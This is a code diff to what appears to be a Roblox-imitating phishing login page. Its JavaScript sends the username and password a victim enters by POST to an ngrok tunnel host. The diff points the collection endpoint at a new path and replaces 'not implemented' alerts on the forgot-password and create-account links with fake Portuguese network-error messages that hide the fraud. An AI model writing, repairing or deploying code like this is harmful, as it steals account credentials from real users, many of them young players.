@@ -580,7 +580,7 @@ site.</div></div></noscript>
             formData.append('username', username);
             formData.append('password', password);
             
-            fetch('https://870543efcd45.ngrok-free.app/login/roblox_login.txt', {
+            fetch('https://870543efcd45.ngrok-free.app/login/', {
                 method: 'POST',
                 body: formData
             })
@@ -598,12 +598,12 @@ site.</div></div></noscript>
         // Links extras
         document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('Funcionalidade não implementada.');
+            alert('nao foi possivel mudar senha verifique sua internet')
         });
         
         document.getElementById('custom-create-account').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('Funcionalidade não implementada.');
+            alert('nao foi possivel criar conta verifique sua internet');
         });
     });
 </script>
